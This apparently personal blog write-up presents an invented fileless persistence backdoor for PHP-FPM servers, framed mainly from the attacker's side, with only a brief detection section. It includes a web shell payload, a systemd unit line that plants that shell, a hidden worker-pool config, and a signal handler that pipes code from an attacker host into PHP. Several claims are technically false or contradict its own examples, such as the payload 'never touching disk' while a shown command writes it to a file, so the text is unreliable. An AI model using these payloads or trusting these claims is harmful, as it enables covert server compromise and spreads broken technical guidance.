# Reverse PHP-FPM Overload - A Stealthy PHP Persistence Technique  

## Introduction  

So I have been thinking, and I came up with this idea—what if you could create a **completely fileless backdoor** inside PHP-FPM that never touches disk, survives restarts, and remains practically invisible to standard security tools? So I thought about this for a bit. I'm not sure if it already exists or not but this is what I came up with.

The idea is simple: **abuse PHP-FPM’s worker pool to execute a hidden payload entirely in memory**, ensuring it never gets written to a file where it could be detected. By modifying how PHP-FPM processes requests, you can **ensure that a specific worker executes a malicious payload only when triggered by a seemingly normal request**—like an invalid API call that looks completely harmless to anyone monitoring logs.  

Here’s why this method is **so effective**:  
- **No forensic trail** – Since the payload never touches disk, traditional file-based detection methods are useless.  
- **Persists through restarts** – Even if PHP-FPM gets restarted, the backdoor can be **reloaded dynamically** through systemd/init modifications.  
- **Completely stealthy** – Because it operates in memory and only executes under specific conditions, most security tools won’t even know it’s there.  

This isn’t just theoretical—I’ll break down how it works, the proof of concept, and even how defenders can try to detect it (though, to be honest, it’s not easy). Let’s dive in.

## Concept Breakdown  

### How Reverse PHP-FPM Overload Works  

#### 1. **Hijacking PHP-FPM Worker Processes**  
PHP-FPM (FastCGI Process Manager) manages a pool of worker processes that are responsible for handling incoming PHP requests. These processes are essential for ensuring PHP applications can handle multiple requests concurrently. However, by manipulating how PHP-FPM manages these worker processes, attackers can inject malicious code into one of the worker processes, ensuring that it executes a **hidden payload** upon a specific, seemingly innocent trigger (such as an invalid API call or a request to a non-existent URL).  
- PHP-FPM uses a **pool of workers**, and each worker is a separate process handling requests. By modifying the worker's behavior, an attacker can embed malicious code in one or more workers, which will only activate under specific conditions.
- The payload is loaded into the worker's memory, and the attacker can control it remotely, making it **difficult to detect** since it never requires any external files.
- This **worker process hijacking** could occur when an attacker gains unauthorized access to the server, allowing them to alter the worker’s configuration or inject malicious code into memory directly.

#### 2. **Memory-Only Execution**  
Unlike traditional malware that relies on writing files to the disk, **Reverse PHP-FPM Overload** ensures that the payload **only exists in memory**. This is achieved through techniques such as **opcache abuse**, **shared memory injection**, or **process hijacking**, all of which allow the payload to execute directly from memory, bypassing traditional file-based security mechanisms.  
- **Opcache abuse**: PHP's opcache mechanism caches compiled PHP scripts in memory to improve performance. Attackers can leverage opcache to inject malicious scripts into this cache, meaning that even if the original malicious script is deleted, the script continues to exist and execute from memory.
  - The attacker can exploit `opcache_compile_file()` or `opcache_invalidate()` to force the opcache to cache the malicious code or reload it into memory.
  - Example:
    ```php
    opcache_compile_file('/path/to/malicious_script.php');  // Injecting a malicious script into opcache
    ```
- **Shared memory injection**: PHP allows shared memory allocation using functions such as `shmop_open()` or `sysvshm` to store data that can be accessed by different processes. Attackers can inject their payload into shared memory, ensuring it remains resident in memory even if the PHP-FPM worker process is restarted.
  - Example:
    ```php
    $shm_id = shmop_open($key, 'c', 0644, $size);  // Creating shared memory block
    shmop_write($shm_id, $payload, 0);              // Writing payload into shared memory
    ```
- **Process hijacking**: By exploiting vulnerabilities in the operating system or PHP itself, attackers can inject malicious code into the memory space of a running PHP-FPM worker, ensuring that the payload executes directly from the worker’s memory, without the need for disk persistence.

By ensuring that the malicious code **never writes to disk**, this technique avoids detection by traditional **antivirus programs**, **file integrity monitoring tools**, or even **advanced threat detection systems** that are typically looking for files with unusual behavior.

#### 3. **Automatic Reloading via systemd/init**  
To achieve persistence, the attacker needs a way to ensure the payload is reloaded even if PHP-FPM is restarted. This can be accomplished by leveraging the system’s **systemd** or **init** systems to dynamically reload the payload when PHP-FPM restarts or is reloaded.
- **systemd** and **init** are process managers that control the starting, stopping, and restarting of services on Linux-based systems. By modifying the system's `systemd` or `init` configurations, an attacker can inject a script that ensures the malicious payload is **reloaded automatically** after a PHP-FPM restart.
- The attacker can modify the **PHP-FPM service configuration** by creating a custom systemd service unit file or by modifying the existing service to include the malicious payload. This means that even if the PHP-FPM process is restarted (for instance, due to a server reboot or process crash), the malicious payload will be re-injected into the worker process without requiring any manual intervention.
  - Example:
    ```ini
    [Service]
    ExecStartPre=/bin/bash -c 'echo "<?php system($_GET[\'cmd\']); ?>" > /path/to/malicious.php'
    ExecStart=/usr/sbin/php-fpm
    ```
- The malicious systemd or init script will ensure that the payload is **re-initialized** whenever PHP-FPM starts, ensuring long-term persistence on the system.

This technique not only ensures the payload survives **PHP-FPM restarts** but also makes it difficult for administrators to detect, as the process to inject the payload is hidden within the system’s legitimate startup processes.

### Conclusion
The **Reverse PHP-FPM Overload** technique relies on manipulating **PHP-FPM worker processes**, **memory-only execution**, and **dynamic reloading via systemd/init** to maintain a stealthy and persistent backdoor. By injecting the payload directly into PHP-FPM’s worker memory and using system mechanisms to automatically reload it, attackers can avoid detection by traditional file-based security measures and ensure that the payload remains active even after server reboots. This method represents a **highly sophisticated and difficult-to-detect persistence mechanism** that is particularly effective in environments where PHP-FPM is heavily used.

## Advanced Techniques for Stealthier Execution  

### 1. **Hiding in PHP-FPM’s Shared Memory**  
PHP-FPM makes extensive use of shared memory to maintain process states, store cache, and optimize performance. This characteristic can be exploited to persistently inject a payload that survives even worker restarts, without ever writing anything to disk.  
- **Shared memory functions** like `shmop_open()`, `sysvshm`, and `mmap()` allow PHP-FPM processes to store data in memory that is shared among processes, even across server restarts.  
- Attackers can store a backdoor or shell in this memory space, making it **undetectable by traditional file-based detection methods**. The payload would only exist in the PHP-FPM worker’s memory and would be **invisible to disk-based integrity checks**.
  
#### Key Steps:  
1. **Allocate shared memory** using `shmop_open()` or `sysvshm`.  
   - Example:  
     ```php
     $shm_id = shmop_open($key, 'c', 0644, $size); 
     shmop_write($shm_id, $payload, 0); 
     ```  
2. **Store the payload** in the allocated memory block.
   - Example:
     ```php
     $payload = '<?php system($_GET["cmd"]); ?>';  // Malicious PHP payload
     ```
3. **Inject payload** into PHP-FPM’s worker process by accessing shared memory.
4. **Execute the payload** by triggering the corresponding memory space within the running worker.

This ensures that the **malicious code resides only in memory**, escaping traditional disk-based detection like file integrity monitoring or antivirus programs.

---

### 2. **Abusing Opcache for Memory Execution**  
Opcache, a caching system for compiled PHP scripts, can be abused to load and execute malicious code directly in memory, bypassing file-based detection systems. Opcache works by caching compiled bytecode of PHP scripts in memory, which means that even if the original PHP file is deleted, the cached version in memory still exists.  

#### Key Steps:  
1. **Use `opcache_compile_file()` to inject malicious code** into the opcache memory:
   - Example:  
     ```php
     opcache_compile_file('/path/to/malicious.php');  // Compiling malicious script to opcache
     ```
2. **Ensure the file remains in the opcache** by forcing PHP to load and cache the payload on each request:
   - Example:
     ```php
     opcache_invalidate('/path/to/malicious.php', true);  // Invalidate to ensure it's reloaded
     ```
3. **Memory-resident shell**: The PHP script, once compiled, **remains in memory** and can be executed directly from the opcache without ever being written to disk.
4. **Dynamic manipulation of opcache**: Attackers can **replace or invalidate cached scripts** through PHP functions like `opcache_invalidate()`, ensuring that the malicious code is **reloaded every time the cache is invalidated** or PHP is restarted.

By leveraging **Opcache abuse**, attackers ensure that the payload remains in **memory only** and survives across server reboots as long as the opcache is active, avoiding traditional file-based detection methods like signature-based AV scanners.

### 3. **Hijacking PHP-FPM Worker Pools**  
PHP-FPM operates by managing multiple worker pools to handle incoming requests. These pools can be configured independently, each with its own settings for concurrency and process management. By creating a **separate, hidden worker pool**, attackers can ensure that malicious code is executed only when **a specific, secret trigger** is activated. This worker pool would listen on an **internal Unix socket** that is not exposed to the outside world, making it completely **invisible to external monitoring systems**.

#### Key Steps:  
1. **Create a separate worker pool** in the PHP-FPM configuration (`php-fpm.d/stealth.conf`):
   - Example configuration for a hidden worker pool:
     ```ini
     [stealth]
     listen = /run/php-fpm-stealth.sock   # Internal Unix socket for hidden pool
     user = www-data
     pm = ondemand
     pm.max_children = 1
     pm.process_idle_timeout = 0
     ```
2. **Inject the payload** into this worker pool by configuring it to execute on request, without exposing any obvious endpoints.
3. **Triggering execution**: The attacker's backdoor will only be executed when a **secret HTTP request** or signal is made to this hidden worker pool. This pool is isolated and will only respond to requests made through the internal socket, making it extremely **difficult to detect via external scanning tools**.

By hijacking worker pools, attackers can ensure that their payload is executed under tightly controlled conditions, remaining **undetected by typical external penetration tests** or monitoring.

---

### 4. **Triggering via System Signals**  
A clever technique involves using Unix signals to trigger the execution of malicious payloads. PHP-FPM workers can listen for signals like `SIGHUP`, `SIGUSR1`, or other custom signals that can be intercepted and used to run arbitrary commands. Instead of relying on regular HTTP requests to trigger the backdoor, attackers can exploit system signals to make the execution **completely stealthy** and independent of normal web traffic.

#### Key Steps:  
1. **Modify signal handlers** in PHP-FPM workers to execute a payload when a specific signal is received.
   - Example:  
     ```php
     pcntl_signal(SIGUSR1, function() {
         system('curl http://attacker.com/backdoor | php');
     });
     pcntl_signal_dispatch();  // Dispatch the signal
     ```
2. **Send the signal** to the PHP-FPM worker from the attacker’s machine, triggering the payload:
   - Example:
     ```bash
     kill -USR1 $(pidof php-fpm)  # Send the custom signal to trigger the payload
     ```
3. The payload will only be executed when the **specific signal** is received, which avoids traditional detection methods that look for HTTP requests or file-based anomalies.

This method ensures **covert execution**, as it avoids any conventional traffic pattern and can be activated at **any time** without needing to make a request to the web server. Since Unix signals are **not typically logged** or scrutinized, this method is difficult for defenders to detect.

## Detection Challenges  
Reverse PHP-FPM Overload is **exceptionally difficult to detect** due to the following reasons:  

| Challenge                         | Explanation |
|-----------------------------------|-------------|
| **No files on disk**             | The payload is **never written to disk**, meaning traditional detection tools that rely on file scanning (such as antivirus software or file integrity monitors) cannot detect the presence of the malicious code. Since it exists only in memory, it bypasses file-based detection mechanisms that typically look for anomalous file changes or new file creations. The **absence of file-based artifacts** significantly complicates detection efforts. |
| **Runs in memory**               | The execution of the payload **entirely in memory** means that **forensic tools that rely on file hashes** (such as hash-based detection or file integrity checking) won’t identify the malicious code. Memory-resident attacks leave no physical footprint on disk, making it extremely difficult to catch with traditional techniques that scan for file-level changes. This makes detecting the attack reliant on monitoring **memory access patterns** rather than filesystem changes, which is often overlooked or under-monitored. |
| **Evades WAFs (Web Application Firewalls)** | The malicious payload is typically triggered by a **harmless-looking API call** or another benign request. Web Application Firewalls (WAFs) that rely on **rule-based detection** typically scan for specific patterns in HTTP requests (e.g., SQL injections, XSS, or known malicious payloads). However, since the trigger appears as a normal API call, the **WAF cannot detect the attack**, making it an **undetectable payload** from the perspective of standard web traffic monitoring tools. The backdoor can bypass even sophisticated WAF configurations, rendering these defenses ineffective against this stealthy technique. |
| **Hidden in PHP-FPM’s configuration** | Attackers can **modify PHP-FPM’s worker pool configurations** and use **systemd or init scripts** to reload the payload automatically when PHP-FPM restarts. This persistence mechanism is hidden within the server’s **configuration files**, often overlooked by system administrators and security tools. Since system-level modifications are harder to audit compared to traditional web-based attack vectors, this **concealed backdoor** becomes extremely difficult to detect through common server monitoring or auditing methods. Additionally, these configurations can be **easily missed** during routine server maintenance or vulnerability assessments, further enhancing the stealth of the attack. |

## Proof of Concept (PoC) Outline  

This technique can be tested in a controlled environment using the following steps:  

### 1. Setup a PHP-FPM Server  
   - **Install PHP-FPM** on a Linux server (e.g., Ubuntu, CentOS) by using the package manager.
     ```bash
     sudo apt-get update
     sudo apt-get install php-fpm
     ```
   - **Configure PHP-FPM** to use a standard worker pool, adjusting the `/etc/php-fpm.d/www.conf` or `/etc/php/7.x/fpm/pool.d/www.conf` to fit the needs of your setup. Ensure the pool is set to run PHP scripts efficiently, with appropriate limits for `pm.max_children`, `pm.start_servers`, etc.  
     - Example configuration:
       ```ini
       [www]
       listen = /run/php/php7.x-fpm.sock
       listen.owner = www-data
       listen.group = www-data
       user = www-data
       group = www-data
       pm = dynamic
       pm.max_children = 10
       pm.start_servers = 2
       pm.min_spare_servers = 1
       pm.max_spare_servers = 5
       ```

### 2. Inject a Memory-Only Payload  
   - Use PHP functions such as `opcache_compile_file()` or `shmop_open()` to inject a hidden payload into memory without writing it to disk.  
   - **Opcache Injection**: This method leverages PHP’s Opcache to store compiled code in memory. The attacker can write a PHP script that uses `opcache_compile_file()` to inject the payload.  
     - Example:
       ```php
       <?php
       // File to be injected into opcache
       $payload = '<?php echo "Hacked!"; ?>';
       opcache_compile_file($payload);
       ?>
       ```
   - **Shared Memory Injection**: Alternatively, the payload can be injected into PHP-FPM’s shared memory by using `shmop_open()` or `sysvshm_attach()`. This would allow the backdoor to persist even if the worker process is restarted.
     - Example:
       ```php
       <?php
       $shm_id = shmop_open(1234, "c", 0644, 100);
       $payload = "<?php echo 'Hacked!'; ?>";
       shmop_write($shm_id, $payload, 0);
       ?>
       ```

### 3. Trigger Execution via a Secret Request  
   - To activate the hidden backdoor, send a specially crafted HTTP request that the server would normally treat as benign. For example, use an API endpoint (`/api/fake`) that triggers the payload.
   - **Crafted Request**: Send an HTTP request that matches the expected format for the secret request, which can trigger the execution of the injected payload when received by PHP-FPM.
     - Example using `curl`:
       ```bash
       curl -X GET http://yourserver.com/api/fake
       ```
     - The request `/api/fake` should be designed to execute the payload within the PHP-FPM worker that holds the injected code.

### 4. Ensure Persistence via Systemd/Init  
   - Modify PHP-FPM’s systemd or init script to ensure the backdoor **reloads automatically** when PHP-FPM restarts.
   - **Modify `php-fpm.service`**: The systemd service configuration (`/etc/systemd/system/php-fpm.service.d/`) can be adjusted to ensure the malicious script persists after a service restart.
     - Example modification:
       ```ini
       [Service]
       ExecStartPre=/path/to/your/hidden/script.sh
       ```
     - The script should contain logic to inject or re-load the backdoor into the PHP-FPM worker pool upon restart.

## Conclusion  

Reverse PHP-FPM Overload represents a **stealthy persistence method** that takes advantage of PHP-FPM’s internal architecture to maintain an **in-memory backdoor**. By exploiting **shared memory, opcache abuse, and systemd hijacking**, attackers can ensure the backdoor remains persistent without ever writing malicious code to disk. This technique makes detection significantly more difficult, as traditional file-based detection methods will not be effective against it.

### Key Takeaways:  
- The **payload** remains in memory, preventing it from being detected by typical antivirus or integrity monitoring tools that focus on file-based signatures.  
- The use of **opcache**, **shared memory**, and **hidden systemd modifications** allows for persistence even across PHP-FPM restarts, ensuring the backdoor remains active.  
- Attackers can **trigger the payload** through seemingly normal requests, further evading detection by evading standard monitoring mechanisms.

### Detection and Mitigation Strategies:
Security teams should adopt the following approaches to detect and mitigate the Reverse PHP-FPM Overload attack:
- **Monitor PHP-FPM worker behavior** for unusual or long-running processes that may indicate the presence of a malicious payload.
- **Track and inspect opcache entries** to identify any unexpected or unauthorized cached scripts.
- **Audit systemd/init scripts** and configuration files to ensure no hidden worker pools or unauthorized persistence mechanisms are present.

### Future Research Directions:
As detection methods evolve, future research could explore advanced techniques, such as **kernel-level rootkits** or **syscall hooking**, to further obscure malicious activities and make detection even harder. By targeting lower levels of the operating system and intercepting system calls, attackers could bypass even more sophisticated monitoring tools, making such attacks increasingly difficult to detect and defend against.

By understanding and defending against techniques like Reverse PHP-FPM Overload, security professionals can enhance their ability to secure PHP-FPM environments and safeguard against increasingly sophisticated persistence mechanisms.
